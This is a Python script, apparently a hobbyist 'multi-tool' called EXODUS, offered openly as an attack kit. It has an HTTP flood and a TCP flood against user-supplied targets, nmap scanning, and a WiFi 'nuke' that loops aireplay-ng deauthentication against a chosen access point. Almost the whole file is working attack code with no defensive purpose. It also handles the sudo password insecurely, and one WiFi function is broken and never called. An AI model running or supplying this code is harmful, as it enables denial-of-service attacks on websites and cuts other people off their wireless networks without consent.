#!/usr/bin/env python3
"""
EXODUS — Multi-tool  |  by Retribution  |  v1.1
Single-file Python implementation.
"""

import os
import subprocess
import threading
import sys
import socket
import random
import time
from pathlib import Path

# ─── ANSI escape codes ────────────────────────────────────────────────────────
RED   = '\033[91m'
WHITE = '\033[97m'
DIM   = '\033[2;37m'
RESET = '\033[0m'

# ─── Editable placeholders ────────────────────────────────────────────────────
# TODO: Replace these strings with your real values before distributing.
INFO1   = "Low resources python DOS/HTTP flood tool"     # short tool description shown in the header
OPTION1 = "HTTP Flood attack (4 web)"   # menu option 1 label
OPTION2 = "DOS attack (4 IP or web)"   # menu option 2 label
OPTION3 = "Nuke current WiFi network"   # menu option 3 label
OPTION4 = "Update dependencies"   # menu option 4 label
INIT1   = "Enter target URL"     # prompt for URL input           (option 1)
INIT2   = "Choose attack intensity"     # prompt for intensity selection (option 1)
INIT3   = "Target IP/URL"     # prompt for target input        (option 2)
INIT4   = "Port target (0-65535). If you don't know witch port to attack nmap or nmap full scan. Nmap can take a while to scan.    You can use port 80"     # prompt for port input          (option 2)
INIT5   = "Choose attack intensity"     # prompt for intensity selection (option 2)

# ─── ASCII logo ───────────────────────────────────────────────────────────────
LOGO = """\
\u2593\u2588\u2588\u2588\u2588\u2588 \u2592\u2588\u2588   \u2588\u2588\u2592 \u2592\u2588\u2588\u2588\u2588\u2588  \u2593\u2588\u2588\u2588\u2588\u2588\u2584  \u2588    \u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588 
\u2593\u2588   \u2580 \u2592\u2592 \u2588 \u2588 \u2592\u2591\u2592\u2588\u2588\u2592  \u2588\u2588\u2592\u2592\u2588\u2588\u2580 \u2588\u2588\u258c \u2588\u2588  \u2593\u2588\u2588\u2592\u2592\u2588\u2588    \u2592 
\u2592\u2588\u2588\u2588   \u2591\u2591  \u2588   \u2591\u2592\u2588\u2588\u2591  \u2588\u2588\u2592\u2591\u2588\u2588   \u2588\u258c\u2593\u2588\u2588  \u2592\u2588\u2588\u2591\u2591 \u2593\u2588\u2588\u2584   
\u2592\u2593\u2588  \u2584  \u2591 \u2588 \u2588 \u2592 \u2592\u2588\u2588   \u2588\u2588\u2591\u2591\u2593\u2588\u2584   \u258c\u2593\u2593\u2588  \u2591\u2588\u2588\u2591  \u2592   \u2588\u2588\u2592
\u2591\u2592\u2588\u2588\u2588\u2588\u2592\u2592\u2588\u2588\u2592 \u2592\u2588\u2588\u2592\u2591 \u2588\u2588\u2588\u2588\u2593\u2592\u2591\u2591\u2592\u2588\u2588\u2588\u2588\u2593 \u2592\u2592\u2588\u2588\u2588\u2588\u2588\u2593 \u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592
\u2591\u2591 \u2592\u2591 \u2591\u2592\u2592 \u2591 \u2591\u2593 \u2591\u2591 \u2591\u2592\u2591\u2592\u2591\u2592\u2591  \u2592\u2592\u2593  \u2592 \u2591\u2592\u2593\u2592 \u2592 \u2592 \u2592 \u2592\u2593\u2592 \u2592 \u2591
 \u2591 \u2591  \u2591\u2591\u2591   \u2591\u2592 \u2591  \u2591 \u2592 \u2592\u2591  \u2591 \u2592  \u2592 \u2591\u2591\u2592\u2591 \u2591 \u2591 \u2591 \u2591\u2592  \u2591 \u2591
   \u2591    \u2591    \u2591  \u2591 \u2591 \u2591 \u2592   \u2591 \u2591  \u2591  \u2591\u2591\u2591 \u2591 \u2591 \u2591  \u2591  \u2591  
   \u2591  \u2591 \u2591    \u2591      \u2591 \u2591     \u2591       \u2591           \u2591  
                          \u2591                        """

SEP      = DIM + "\u2500" * 56 + RESET
INFO_STR = f"{INFO1} by Retribution.          (v1.1)"


# ─── Core display helpers ─────────────────────────────────────────────────────

def clr():
    """Clear the terminal screen."""
    os.system('cls' if os.name == 'nt' else 'clear')


def show_header():
    """Clear screen and print the EXODUS logo + info line."""
    clr()
    print(RED + LOGO + RESET)
    print(WHITE + "\n" + INFO_STR + RESET)


def prompt(*lines, error=None):
    """
    Render a full screen: header → separator → content lines →
    optional error → input prompt.
    Returns the stripped user input.
    """
    show_header()
    print()
    print(SEP)
    print()
    for line in lines:
        print(WHITE + "  " + str(line) + RESET)
    if lines:
        print()
    if error:
        print(DIM + "  [!] " + error + RESET)
        print()
    return input(WHITE + "  > " + RESET).strip()


# ─── URL / IP helpers ─────────────────────────────────────────────────────────

def normalize_url(raw: str):
    """
    Normalize a user-supplied URL string.
    Returns the normalized URL string, or None if the input is invalid.

    Rules
    -----
    - Host must contain at least one dot, otherwise → invalid.
    - Keep 'http://' if present, keep 'https://' if present,
      otherwise prepend 'https://'.
    - Add 'www.' only when the host is a bare domain (exactly one dot,
      e.g. 'google.com'). Hosts that already have a subdomain
     (two or more dots, e.g. 'store.steampowered.com' or 'www.example.com')
     are left untouched.
    """
    s = raw.strip()
    if not s:
        return None

    if s.startswith('https://'):
        protocol, rest = 'https://', s[8:]
    elif s.startswith('http://'):
        protocol, rest = 'http://', s[7:]
    else:  
        protocol, rest = 'https://', s

    # separate host from the rest of the path
    slash = rest.find('/')
    host  = rest[:slash] if slash != -1 else rest
    path  = rest[slash:] if slash != -1 else ''

    if not host or '.' not in host:
        return None                          # no dot → not a valid domain

    if host.count('.') == 1:                # bare domain → prepend www.
        host = 'www.' + host

    return protocol + host + path


def valid_ipv4(s: str) -> bool:
    """
    Return True if *s* is a valid dotted-decimal IPv4 address:
    exactly 4 dot-separated decimal octets in [0–255],
    with a total digit count between 4 and 12.
    """
    parts = s.split('.')
    if len(parts) != 4:
        return False
    total = 0
    for p in parts:
        if not p.isdigit():
            return False
        if int(p) > 255:
            return False
        total += len(p)
    return 4 <= total <= 12


# ─── Reusable pickers ─────────────────────────────────────────────────────────

def pick_workers(label: str):
    """
    Display the thread-intensity picker labelled with *label*.
    Returns 50, 100 or 150 (worker count), or None when the user presses 'r'.
    """
    err = None
    while True:
        val = prompt(
            f"{label}: low [1], medium [2] or high (high resources) [3]?",
            "r) return",
            error=err,
        )
        err = None
        v = val.lower()

        if v == 'r':
            return None

        elif v in ('1', 'low'):
            return 50

        elif v in ('2', 'medium'):
            return 100

        elif v in ('3', 'high'):
            # extra confirmation for the high-resource mode
            warn_err = None
            while True:
                c = prompt(
                    "Warning: high mode will consume a lot of system resources.",
                    "Continue anyway? (y/n)",
                    error=warn_err,
                )
                warn_err = None
                if c.lower() == 'y':
                    return 150
                elif c.lower() == 'n':
                    break                    # back to intensity picker
                else:
                    warn_err = f"'{c}' is not a correct value."

        else:
            err = f"'{val}' is not a correct value, select a value from 1 to 3."


def pick_port(label: str):
    """
    Ask the user for a port number in [0–65535].
    Also handles 'n' (nmap {ip}) and 'n -p' (nmap -p- {ip}).
    Returns the port integer, or None when the user presses 'r'.
    """
    err = None
    while True:
        val = prompt(
            label,
            "(0-65535  |  'n' = nmap scan  |  'n -p' = nmap full scan)",
            "r) return",
            error=err,
        )
        err = None
        v = val.lower().strip()

        if v == 'r':
            return None

        if v in ('n', 'n -p'):
            # Ask for the target IP
            ip_err = None
            while True:
                raw_ip = prompt(
                    "Enter the target IPv4 address:",
                    "r) return",
                    error=ip_err,
                )
                ip_err = None
                if raw_ip.lower() == 'r':
                    break                        # back to port prompt
                if valid_ipv4(raw_ip):
                    cmd = ['nmap', '-p-', raw_ip] if v == 'n -p' else ['nmap', raw_ip]
                    show_header()
                    print()
                    print(SEP)
                    print(WHITE + "\n  Please be patient, this may take a few minutes...\n" + RESET)
                    subprocess.run(cmd)
                    input(WHITE + "\n  Press Enter to continue..." + RESET)
                    break
                else:
                    ip_err = f"'{raw_ip}' is not a valid address."
            continue

        try:
            p = int(val)
            if 0 <= p <= 65535:
                return p
            raise ValueError
        except ValueError:
            err = f"'{val}' is not a correct value."


def confirm_continue() -> bool:
    """
    Ask the user to confirm with y/n.
    Returns True (proceed to sequence) or False (return to main menu).
    """
    err = None
    while True:
        val = prompt("Are you sure you want to continue? (y/n)", error=err)
        err = None
        v = val.lower()
        if v == 'y':
            return True
        elif v == 'n':
            return False
        else:
            err = f"'{val}' is not a correct value."


# ─── Sequences — implement your own logic inside these ───────────────────────

def seq1(url: str, workers: int):
    # Variable global para controlar el ataque
    global attack_running
    attack_running = True
    
    show_header()
    print()
    print(SEP)
    print(WHITE + f"\n  [seq1]  url = {url}  |  workers = {workers}\n" + RESET)
    print()
    print(SEP)
    import requests

    requests_per_worker = 1000
    
    def attack():
        for _ in range(requests_per_worker):
            if not attack_running:
                break
            try:
                requests.get(url, timeout=2)
            except:
                pass

    print(f'Starting HTTP Flood attack on {url}...')
    print(f'Launching {workers} workers with {requests_per_worker} requests each.')
    print('Press "s + Enter" to stop the attack.')
    time.sleep(1)
    print('Starting in 3...')
    time.sleep(1)
    print('Starting in 2...')
    time.sleep(1)
    print('Starting in 1...')
    time.sleep(1)

    threads = []
    for i in range(workers):
        print(f'Launching worker #{i+1}...')
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        while attack_running:
            if input().strip().lower() == 's':
                attack_running = False
                break
    except KeyboardInterrupt:
        attack_running = False
    finally:
        print('\nAttack stopped.')
        time.sleep(1) 
        # Vuelve al menú principal


def seq2(target: str, port: int, workers: int):
    show_header()
    print()
    print(SEP)
    print(WHITE + f"\n  [seq2]  target = {target}  |  port = {port}  |  workers = {workers}\n" + RESET)
    print()
    print(SEP)
    packets_per_worker = 1000
    print('Press "s + Enter" to stop the attack.')
    time.sleep(1)
    print('Starting in 3...')
    time.sleep(1)
    print('Starting in 2...')
    time.sleep(1)
    print('Starting in 1...')
    time.sleep(1)

    def attack():
        for _ in range(packets_per_worker):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.send(random._urandom(1024))
                s.close()
            except:
                pass

    print(f'Starting network attack on {target}:{port}...')
    print(f'Launching {workers} workers with {packets_per_worker} packets each.')
    print('Press Ctrl+C to stop the attack.')

    threads = []
    for i in range(workers):
        print(f'Launching worker #{i+1}...')
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print('\nAttack stopped.')
        sys.exit(0)


def seq3_wifi_nuke():
    """
    Nueva función para nukear la red WiFi actual
    """
    show_header()
    print()
    print(SEP)
    print(WHITE + "\n  Starting Wifi Nuke tool...\n" + RESET)
    
    try:
        # Obtener interfaces WiFi disponibles
        import shlex
        import signal
        import atexit
        result = subprocess.run("iwconfig 2>/dev/null | grep -E '^[a-zA-Z]' | cut -d' ' -f1", 
                               shell=True, capture_output=True, text=True)
        interfaces = result.stdout.strip().split('\n')
        
        if not interfaces or interfaces == ['']:
            print("No WiFi interfaces found. Make sure you have WiFi capabilities.")
            input(WHITE + "\n  Press Enter to return to menu..." + RESET)
            return
            
        print("Available WiFi interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"{i+1}. {iface}")
            
        iface_choice = input("Select interface number (default 1): ").strip()
        if not iface_choice:
            iface_choice = "1"
            
        try:
            iface_idx = int(iface_choice) - 1
            if 0 <= iface_idx < len(interfaces):
                selected_iface = interfaces[iface_idx]
            else:
                selected_iface = interfaces[0]
        except:
            selected_iface = interfaces[0]
            
        print(f"Using interface: {selected_iface}")
        
        # Desactivar y reactivar la interfaz WiFi
        print("Disabling WiFi interface...")
        subprocess.run(f"sudo ifconfig {selected_iface} down", shell=True)
        time.sleep(2)
        
        print("Enabling WiFi interface...")
        subprocess.run(f"sudo ifconfig {selected_iface} up", shell=True)
        time.sleep(2)
        
        # Escanear redes WiFi
        print("Scanning for WiFi networks...")
        result = subprocess.run(f"sudo iwlist {selected_iface} scan | grep ESSID", 
                               shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            networks = [line.split('"')[1] for line in result.stdout.split('\n') if 'ESSID:' in line and '"' in line]
            if networks:
                print("Found WiFi networks:")
                for i, network in enumerate(networks):
                    print(f"{i+1}. {network}")
                    
                network_choice = input("Select network to attack (number): ").strip()
                try:
                    network_idx = int(network_choice) - 1
                    if 0 <= network_idx < len(networks):
                        target_network = networks[network_idx]
                    else:
                        target_network = networks[0]
                except:
                    target_network = networks[0]
                    
                print(f"Targeting network: {target_network}")
                
                # Lanzar ataque de desautenticación
                print("Launching deauthentication attack...")
                print("This will disconnect all devices from the network.")
                print("Press Ctrl+C to stop the attack.")
                
                try:
                    # Bucle de ataque
                    while True:
                        subprocess.run(f"sudo aireplay-ng -0 10 -a {target_network} {selected_iface}", 
                                      shell=True, stderr=subprocess.DEVNULL)
                        time.sleep(1)
                except KeyboardInterrupt:
                    print("\nAttack stopped.")
            else:
                print("No WiFi networks found.")
        else:
            print("Failed to scan for WiFi networks.")
            
    except Exception as e:
        print(f"Error during WiFi nuke: {str(e)}")
        
    input(WHITE + "\n  Press Enter to return to menu..." + RESET)


# ─── Flow: option 4 — install dependencies ───────────────────────────────────

def flow_install():
    show_header()
    print()
    print(SEP)
    print(WHITE + "\n  Installing dependencies...\n" + RESET)
    subprocess.run(
     '''
        sudo apt update || true &&
        sudo apt install -y python3 || true &&
        sudo apt upgrade -y python3 || true &&
        sudo apt install -y python3-pip || true &&
        sudo apt upgrade -y python3-pip || true &&
        sudo apt install -y nmap ||true &&
        sudo apt upgrade -y nmap ||true &&
        cd ~/ || true &&
        python3 -m venv ~/venv || true &&
        sudo ~/venv/bin/pip install requests || true &&
        sudo ~/venv/bin/pip install wifi || true &&
        sudo ~/venv/bin/pip install scapy || true
       ''',
      shell=True,
      executable='/bin/bash'
    )
    input(WHITE + "\n  Done. Press Enter to return to menu..." + RESET)


# ─── Flow: option 1 — URL-based ──────────────────────────────────────────────

def flow1():
    """
    Step 1 → URL input
    Step 2 → Worker-count selection  (r goes back to step 1)
    Step 3 → Confirm continue        (n goes back to main menu)
    """
    url_err = None
    while True:
        # ── Step 1: URL ───────────────────────────────────────────────────
        raw = prompt(INIT1, "r) return", error=url_err)
        url_err = None

        if raw.lower() == 'r':
            return

        url = normalize_url(raw)
        if url is None:
            url_err = f"'{raw}' is an invalid URL. Check the URL or enter another one."
            continue

        # ── Step 2: Worker count ──────────────────────────────────────────
        workers = pick_workers(INIT2)
        if workers is None:          # 'r' → back to URL input
            continue

        # ── Step 3: Confirm ───────────────────────────────────────────────
        if not confirm_continue():
            return

        seq1(url, workers)
        return


# ─── Flow: option 2 — target + port ──────────────────────────────────────────

def flow2():
    """
    Step 1 → Target input  (IP or domain/URL)
    Step 2 → Port input     (r goes back to step 1)
    Step 3 → Worker-count   (r goes back to step 2)
    Step 4 → Confirm        (n goes back to main menu)
    """
    t_err = None
    while True:
        # ── Step 1: Target ────────────────────────────────────────────────
        raw_t = prompt(INIT3, "r) return", error=t_err)
        t_err = None

        if raw_t.lower() == 'r':
            return

        # Accept a valid IPv4 address OR a valid URL/domain
        target = None
        if valid_ipv4(raw_t):
            target = raw_t
        else:
            u = normalize_url(raw_t)
            if u:
                target = u

        if target is None:
            t_err = f"'{raw_t}' is incorrect. Please try another value."
            continue

        # ── Steps 2 & 3: Port and Worker count ───────────────────────────
        # Inner loop: pressing 'r' in workers resets port and re-asks it;
        # pressing 'r' in port breaks to the outer loop (back to target).
        port = None
        while True:

            # Step 2: Port (only asked when port is None)
            if port is None:
                port = pick_port(INIT4)
                if port is None:     # 'r' → back to target
                    break

            # Step 3: Worker count
            workers = pick_workers(INIT5)
            if workers is None:      # 'r' → back to port
                port = None
                continue

            # ── Step 4: Confirm ───────────────────────────────────────────
            if not confirm_continue():
                return

            seq2(target, port, workers)
            return

        # Fell through: user pressed 'r' during port selection.
        # Outer while-loop will re-show the target prompt cleanly.


# ─── Flow: option 3 — WiFi Nuke ─────────────────────────────────────────────

def flow3():
    """
    Flow for WiFi Nuke functionality
    """
    show_header()
    print()
    print(SEP)
    
    print(WHITE + "\n  Starting Wifi Nuke Tool...\n" + RESET)
    
    try:
        # Obtener interfaces WiFi disponibles
        result = subprocess.run("iwconfig 2>/dev/null | grep -E '^[a-zA-Z]' | cut -d' ' -f1", 
                               shell=True, capture_output=True, text=True)
        interfaces = result.stdout.strip().split('\n')
        
        if not interfaces or interfaces == ['']:
            print("No WiFi interfaces found. Make sure you have WiFi capabilities.")
            input(WHITE + "\n  Press Enter to return to menu..." + RESET)
            return
            
        print("Available WiFi interfaces:")
        for i, iface in enumerate(interfaces):
            print(f"{i+1}. {iface}")
            
        iface_choice = input("Select interface number (default 1): ").strip()
        if not iface_choice:
            iface_choice = "1"
            
        try:
            iface_idx = int(iface_choice) - 1
            if 0 <= iface_idx < len(interfaces):
                selected_iface = interfaces[iface_idx]
            else:
                selected_iface = interfaces[0]
        except:
            selected_iface = interfaces[0]
            
        print(f"Using interface: {selected_iface}")
        
        # Escanear redes WiFi
        print("Scanning for WiFi networks...")
        result = subprocess.run(f"sudo iwlist {selected_iface} scan | grep -E 'ESSID|Address'", 
                               shell=True, capture_output=True, text=True)
        
        if result.returncode == 0:
            lines = result.stdout.split('\n')
            networks = []
            
            # Parsear las líneas para obtener ESSID y dirección MAC
            for i in range(0, len(lines), 2):
                if i+1 < len(lines) and 'Address:' in lines[i] and 'ESSID:' in lines[i+1]:
                    mac = lines[i].split('Address:')[1].strip()
                    essid = lines[i+1].split('ESSID:')[1].strip().strip('"')
                    if essid:  # Solo añadir si hay un nombre de red
                        networks.append({'essid': essid, 'mac': mac})
            
            if networks:
                print("Found WiFi networks:")
                for i, network in enumerate(networks):
                    print(f"{i+1}. {network['essid']} ({network['mac']})")
                    
                network_choice = input("Select network to attack (number): ").strip()
                try:
                    network_idx = int(network_choice) - 1
                    if 0 <= network_idx < len(networks):
                        target_network = networks[network_idx]
                    else:
                        target_network = networks[0]
                except:
                    target_network = networks[0]
                    
                print(f"Targeting network: {target_network['essid']} ({target_network['mac']})")
                
                # Seleccionar tipo de ataque
                print("\nSelect attack mode:")
                print("1. Light mode (disconnect devices temporarily)")
                print("2. Aggressive mode (continuous deauthentication, may require password)")
                
                mode_choice = input("Select mode (1-2, default 1): ").strip()
                if not mode_choice:
                    mode_choice = "1"
                
                if mode_choice == "2":
                    # Modo agresivo - puede requerir contraseña
                    password = input("Enter sudo password if required (leave empty if not): ").strip()
                    if password:
                        # Guardar la contraseña temporalmente para usarla en los comandos
                        with open('/tmp/.wifi_pass', 'w') as f:
                            f.write(password)
                        os.chmod('/tmp/.wifi_pass', 0o600)
                        sudo_prefix = f"echo {password} | sudo -S "
                    else:
                        sudo_prefix = "sudo "
                else:
                    sudo_prefix = "sudo "
                
                # Poner interfaz en modo monitor
                print(f"Putting {selected_iface} in monitor mode...")
                subprocess.run(f"{sudo_prefix}ifconfig {selected_iface} down", shell=True)
                subprocess.run(f"{sudo_prefix}iwconfig {selected_iface} mode monitor", shell=True)
                subprocess.run(f"{sudo_prefix}ifconfig {selected_iface} up", shell=True)
                
                # Lanzar ataque de desautenticación
                if mode_choice == "1":
                    print("Launching light deauthentication attack...")
                    print("This will temporarily disconnect devices from the network.")
                    print("Press Ctrl+C to stop the attack.")
                    
                    try:
                        # Ataque ligero - solo unos pocos paquetes
                        for _ in range(10):
                            subprocess.run(f"{sudo_prefix}aireplay-ng -0 5 -a {target_network['mac']} {selected_iface}", 
                                         shell=True, stderr=subprocess.DEVNULL)
                            time.sleep(1)
                    except KeyboardInterrupt:
                        print("\nAttack stopped.")
                else:
                    print("Launching aggressive deauthentication attack...")
                    print("This will continuously disconnect devices from the network.")
                    print("Press Ctrl+C to stop the attack.")
                    
                    try:
                        # Bucle de ataque agresivo
                        while True:
                            subprocess.run(f"{sudo_prefix}aireplay-ng -0 10 -a {target_network['mac']} {selected_iface}", 
                                         shell=True, stderr=subprocess.DEVNULL)
                            time.sleep(0.5)
                    except KeyboardInterrupt:
                        print("\nAttack stopped.")
                
                # Restaurar interfaz a modo gestionado
                print(f"Restoring {selected_iface} to managed mode...")
                subprocess.run(f"{sudo_prefix}ifconfig {selected_iface} down", shell=True)
                subprocess.run(f"{sudo_prefix}iwconfig {selected_iface} mode managed", shell=True)
                subprocess.run(f"{sudo_prefix}ifconfig {selected_iface} up", shell=True)
                
                # Limpiar contraseña temporal si se usó
                if mode_choice == "2" and password:
                    try:
                        os.remove('/tmp/.wifi_pass')
                    except:
                        pass
            else:
                print("No WiFi networks found.")
        else:
            print("Failed to scan for WiFi networks.")
            
    except Exception as e:
        print(f"Error during WiFi nuke: {str(e)}")
        
    input(WHITE + "\n  Press Enter to return to menu..." + RESET)


# ─── Main menu ────────────────────────────────────────────────────────────────

def main():
    # Variable global para controlar los ataques
    global attack_running
    attack_running = False
    
    # Configurar manejador de señales para ocultar errores al salir
    def signal_handler(sig, frame):
        global attack_running
        attack_running = False
        clr()
        sys.exit(0)
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    import atexit
    atexit.register(clr)

    err = None
    while True:
        val = prompt(
            f"1) {OPTION1}",
            f"2) {OPTION2}",
            f"3) {OPTION3}",
            f"4) {OPTION4}",
            "5) Exit",
            error=err,
        )
        err = None

        if val == '1':
            flow1()
        elif val == '2':
            flow2()
        elif val == '3':
            flow3()
        elif val == '4':
            flow_install()
        elif val == '5':
            subprocess.run('clear', shell=True,)
            sys.exit(0)
        else:
            err = f"'{val}' is not a correct value, select a value from 1 to 5."


if __name__ == '__main__':
    main()